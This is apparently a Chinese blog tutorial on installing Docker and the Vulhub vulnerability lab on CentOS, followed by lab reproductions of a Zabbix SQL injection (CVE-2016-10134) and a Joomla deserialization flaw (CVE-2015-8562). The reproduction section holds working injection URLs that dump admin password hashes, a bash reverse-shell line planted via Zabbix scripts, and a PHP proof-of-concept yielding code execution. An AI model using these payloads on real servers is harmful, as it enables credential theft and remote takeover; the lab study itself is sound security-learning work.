---
title: 搭建vulhub(基于centos)
id: 搭建vulhub
---

<!-- more -->

## 前言

之前有所了解vulhub，但因为一些原因没有深入了解。借助这次任务安装、复现一下漏洞~

使用了：华为云的vps（centos系统）、docker（使用docker的基本要求是linux内核在3.10以上，可用`uname -e`查看）

## 安装过程

安装过程参考自[Centos安装docker+vulhub搭建](https://www.cnblogs.com/Lee-404/p/12763280.html)

vulhub漏洞环境文档详情：[Vulhub - Docker-Compose file for vulnerability environment](https://vulhub.org/#/environments/)

### 配置yum源

#### 备份

```shell
　cd /etc/yum.repos.d

　mkdir repos_bak　　#用来保存备份文件夹

　mv *.repo repos_bak
```

#### 添加新源

```shell
　curl -O http://mirrors.aliyun.com/repo/Centos-7.repo		#此处为阿里源
　curl -O http://mirrors.aliyun.com/repo/epel-7.repo
　curl -O http://mirrors.aliyun.com/repo/epel-testing.repo
　
　yum clean all && yum makecache		#重建源缓存　
```

### 安装docker

#### 确保yum的包为最新

```shell
yum update -y
```

#### 安装基本驱动依赖

```shell
 yum install -y yum-untils device-mapper-persistent-data lvm2
```

#### 使用阿里的docker源

```shell
 yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo　

 yum makecache fast
```

#### 安装docker

安装默认版本：

```shell
yum -y install docker-ce
```

指定版本安装：

```shell
yum list docker-ce --showduplicates | sort -r　　#显示docker版本列表

yum -y install 版本　　#如：yum -y install docker-ce-18.03.1.ce-1.el7.centos
```

#### 验证docker是否安装成功以及开机自启

```shell
docker version				#显示docker版本

systemctl start docker		#启动docker~
systemctl enable docker		#设置开机自启
```

#### 设置国内源（加速镜像使用~）

```shell
vim /etc/docker/daemon.conf  #如果没有就自己创建，然后输入如下内容
```

```shell
{
 　"registry-mirrors": [
           "https://dockerhub.azk8s.cn",
    　     "https://reg-mirror.qiniu.com",
    　　　　"https://registry.docker-cn.com",
    　　　　"http://hub-mirror.c.163.com",
   　　　　 "https://3laho3y3.mirror.aliyuncs.com",
   　　　　 "http://f1361db2.m.daocloud.io",
   　　　　 "https://mirror.ccs.tencentyun.com"
 　　　　     ]
}        
```

vim的小知识：

粘贴完后按一下右上角的`esc`，然后按`:`输入`wq`就可以保存并退出啦~，再加个`!`就是强制保存并退出啦

#### 重启docker：

```shell
systemctl daemon-reload

systemctl restart docker
```

#### 安装docker-compose：

安装前要安装docker噢，在centos安装指令如下，也就是将可执行文件下载到本地即可~~

```shell
curl -L https://github.com/docker/compose/releases/download/1.22.0/docker-compose-`uname -s`-`uname -m` -o /usr/local/bin/docker-compose

chmod +x /usr/local/bin/docker-compose		#添加执行权限！
```

### 安装vulhub

> 官方文档：
>
> Vulhub是一个面向大众的开源漏洞靶场，无需docker知识，简单执行两条命令即可编译、运行一个完整的漏洞靶场镜像。旨在让漏洞复现变得更加简单，让安全研究者更加专注于漏洞原理本身。
>
> 安装`docker`和`docker-compose`后即可开始使用vulhub：

```shell
#安装git，为了后续从github拉取vulhub
yum -y install git 

# 进入漏洞管理目录，在此之前可以mkdir一个~
cd /
mkdir mycve
cd mycve
git clone https://github.com/vulhub/vulhub.git	#拉取vulhub到目录mycve中

# 编译（可选）
docker-compose build 

#进入想安装的漏洞环境目录，运行如下命令即可进行搭建 
docker-compose up -d 

#查看服务的运行端口，加上vps的ip地址就能访问啦~
docker ps

#测试完毕之后，使用此命令即可结束服务，使环境变为初始状态。
docker-compose down 
```

#### 关于漏洞环境搭建的一些补充

vulhub集成了许多漏洞环境，如下

![vulhub集成的环境](https://i.loli.net/2021/02/13/Yqo4HjfZFnGBEPi.png)

进入想要下载的环境~

![](https://i.loli.net/2021/02/13/4pPbWUGdxfKIs7k.png)

再进入相应漏洞目录，运行如下命令即可进行搭建 

```shell
docker-compose up -d 
```

这里我安装了zabbix的CVE-2016-10134(SQL注入漏洞)

然后访问vps的ip:对应端口即可，如下~

![](https://i.loli.net/2021/02/13/f325W7Ja8FOEejr.png)

复现完之后记得还原初始环境噢：

```shell
docker-compose down 
```

删除整个环境：

```
docker-compose down -v
```



> ps:kali-linux安装vulhub
>
> ```shell
> apt-get update  ##顺便更新一下软件
> apt install docker.io  ##安装docker
> docker -v  ##查看docker版本
> systemctl start docker  ##开启docker,不执行这条也行，能看到版本就已经开启服务了
> docker ps -a  ##显示docker信息
> apt-get install python3-pip  ##安装pip，需要python3的环境
> pip3 -V  ##看看pip的版本
> pip3 install docker-compose  ##使用pip安装docker-compose
> docker-compose -v  ##看看docker-compose的版本
> 
> mkdir /cve
> cd /cve
> git clone https://github.com/vulhub/vulhub.git  ##下载靶场
> 
> 其余的启动和关闭靶场同上~
> ```

## 漏洞复现

这里先随便复现两个过过瘾吧，后面再另作目录分组记录~

### zabbix latest.php SQL注入漏洞（CVE-2016-10134）

#### 概述

zabbix是一款服务器监控软件，其由server、agent、web等模块组成，其中web模块由PHP编写，用来显示数据库中的结果。

zabbix 2.2.x, 3.0.0-3.0.3版本存在SQL注入漏洞，攻击者无需授权登陆即可登陆zabbix管理系统

Zabbix 的`latest.php中的toggle_ids[]`或`jsrpc.php中的profieldx2参数`存在sql注入，通过sql注入获取管理员账户密码，进入后台，进行getshell操作。



#### 复现

#### latest.php中的toggle_ids[]

需要靶机系统未关闭默认开启guest账户登陆，zabbix 默认账户Admin密码zabbix（弱口令尝试一波~）

使用username：guest，password为空的游客账户登陆

![](https://i.loli.net/2021/02/13/f325W7Ja8FOEejr.png)

登录后，查看Cookie中的`zbx_sessionid`，复制后16位字符：

![](https://i.loli.net/2021/02/13/xBVOFagXmtnzeru.png)

将这16个字符作为sid的，构造payload：

```
http://your-ip:8080/latest.php?output=ajax&sid=******************&favobj=toggle&toggle_open_state=1&toggle_ids[]=updatexml(0,concat(0xa,database(),0xa,user()),0)
```

如下：

![](https://i.loli.net/2021/02/13/8uvI9oCdWnzlmYO.png)

#### jsrpc.php的profieldx2参数

也可以通过jsrpc.php触发，且无需登陆

```
http://your-ip:8080/jsrpc.php?type=0&mode=1&method=screen.get&profileIdx=web.item.graph&resourcetype=17&profileIdx2=updatexml(0,concat(0xa,database(),0xa,user()),0)
```

如下：

![](https://i.loli.net/2021/02/13/HaBdrgTc81yhO5S.png)



#### getshell

然后就是常规的注入流程啦。拿到管理员账户密码~

payload:

```
http://yourip:8080/jsrpc.php?type=0&mode=1&method=screen.get&profileIdx=web.item.graph&resourcetype=17&profileIdx2=updatexml(0,concat(0x7e,substr((select group_concat(surname,0x2a,passwd) from users ),1)),0)
```

![](https://i.loli.net/2021/02/13/YoTeb7l6DZ5qFnj.png)
![](https://i.loli.net/2021/02/13/pALPrzy957bBg1x.png)



Administrator

5fce1b3e34b520afeffb37ce08c7cd66

![](https://i.loli.net/2021/02/13/1mDdf2a5tz7LHEJ.png)

MD5解密即得密码zabbix

```
管理员账户：（不懂为啥，用户名是Admin，可能是环境问题？）
Admin
zabbix
```



登入后如下图点击~在administration下的scripts添加命令

![](https://i.loli.net/2021/02/13/lOjT4emRzKL6cqE.png)

写入反弹shell：

```bash
bash -i >& /dev/tcp/你的ip/你的端口 0>&1
```

![](https://i.loli.net/2021/02/13/XpjChdwn92AJL76.png)

触发脚本，然后NC监听即可~

![](https://i.loli.net/2021/02/13/Y9XRjwgMPTvnEHl.png)

### Joomla 3.4.5 反序列化漏洞（CVE-2015-8562）

#### 安装过程

老样子，只是在网页配置过程注意填入如下数据

![](https://i.loli.net/2021/02/13/mLkDCOvWSzawQ8p.png)

#### 概述

本漏洞根源是PHP5.6.13前的版本在读取存储好的session时，如果反序列化出错则会跳过当前一段数据而去反序列化下一段数据。而Joomla将session存储在Mysql数据库中，编码是utf8，当我们插入4字节的utf8数据时则会导致截断。截断后的数据在反序列化时就会失败，最后触发反序列化漏洞。

##### 影响版本

- Joomla 1.5.x, 2.x, and 3.x before 3.4.6
- PHP 5.6 < 5.6.13, PHP 5.5 < 5.5.29 and PHP 5.4 < 5.4.45

##### 分析



1.在低版本的php中,反序列化函数unserialize做了欠缺的异常处理。即不能正确解析需要反序列化的字符串时，会查找字符串中的下一个标识符"|",从此处分割，以标识符前段做段名，再次解析标识符后段的字符串，直到成功或返回空。(此漏洞修复版本为:4.5.45 5.5.29 5.6.13 7.x)

> 在php5.6.13以前的版本里，php在获取session字符串以后，就开始查找第一个|，然后用这个|将字符串分割成『键名』和『键值』。
> 用unserialize解析键值，解析结果作为session。
>
> 但如果这个unserialize解析失败，就放弃这次解析。找到下一个|，再根据这个|将字符串分割成两部分，执行同样的操作，直到解析成功。





2.mysql在低版本或未配置utf8mb4时处理4字节utf字符会从4字节处截断，即丢弃截断处后的字符。（在mysql 5.5.3以后 可以通过设置字段为utf8mb4来避免漏洞）

> 在我们构造好的反序列化字符串后面，还有它原本的内容，必须要截断。而此处并不像SQL注入，还有注释符可用。
>
> 在插入数据库的时候利用`𝌆`（%F0%9D%8C%86）字符将utf-8的字段截断了。
>
> 这里我们用同样的方法，在session进入数据库的时候就截断后面的内容，避免对我们反序列化过程造成影响。



3.joomla在对useragent处理时会将useragent作为一个session存入数据库，没有过滤引起php反序列漏洞的"|"符号。

> joomla对session的存储格式为：`键名 + | + 经serialize()序列化处理的值`
>
> 此处漏洞主要利用joomla存储格式对 | 的处理不当，导致攻击者可以利用 | 伪造，使得 | 前都为name， | 后就作为我们要插入的序列化字符串，即可构成反序列化漏洞。



这个joomla漏洞的核心内容就是：我们通过`𝌆`字符， 将原本的session截断了，结果因为长度不对所以第一次解析|失败，才轮到第二次解析传入的 | ，最后成功利用。

所以，构造session出错，是这个漏洞成立的核心。



**整个流程：**

第一次传包：

客户端User-Agent字符串-》joomla将User-Agent字符串存储为session-》合并到session表中，序列化，将含poc的字符串存入数据库**（mysql截断漏洞）**

第二次传包：

客户端发起请求-》从数据库中读入数据库并反序列化session**（php反序列化漏洞）**-》执行poc，闭合函数



### 复现

不带User-Agent头，先访问一次目标主页，记下服务端返回的Cookie：

![](https://i.loli.net/2021/02/13/YvDAh5ro3GLyMQu.png)



vulhub文档滴poc：			（在线执行[PHP Sandbox, test PHP online, PHP tester (onlinephpfunctions.com)](https://sandbox.onlinephpfunctions.com/code/17e7080841ccce12f6c6e0bb1de01b9e390510bd)）

```php
<?php
class JSimplepieFactory {
}
class JDatabaseDriverMysql {

}
class SimplePie {
    var $sanitize;
    var $cache;
    var $cache_name_function;
    var $javascript;
    var $feed_url;
    function __construct()
    {
        $this->feed_url = "phpinfo();JFactory::getConfig();exit;";
        $this->javascript = 9999;
        $this->cache_name_function = "assert";
        $this->sanitize = new JDatabaseDriverMysql();
        $this->cache = true;
    }
}

class JDatabaseDriverMysqli {
    protected $a;
    protected $disconnectHandlers;
    protected $connection;
    function __construct()
    {
        $this->a = new JSimplepieFactory();
        $x = new SimplePie();
        $this->connection = 1;
        $this->disconnectHandlers = [
            [$x, "init"],
        ];
    }
}

$a = new JDatabaseDriverMysqli();
$poc = serialize($a); 

$poc = str_replace("\x00*\x00", '\\0\\0\\0', $poc);

echo "123}__test|{$poc}\xF0\x9D\x8C\x86";
```

将生成好的POC作为User-Agent，带上第一步获取的Cookie发包，这一次发包，脏**数据进入Mysql数据库**。

然后同样的包**再发一次**，我们的代码被执行：

![](https://i.loli.net/2021/02/13/Lhlf4DN5pH7erMv.png)

参考

[Joomla远程代码执行漏洞分析（总结） | 离别歌 (leavesongs.com)](https://www.leavesongs.com/PENETRATION/joomla-unserialize-code-execute-vulnerability.html#session)

[Joomla 3.4.5 反序列化漏洞（CVE-2015-8562) 分析 - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/64017530)

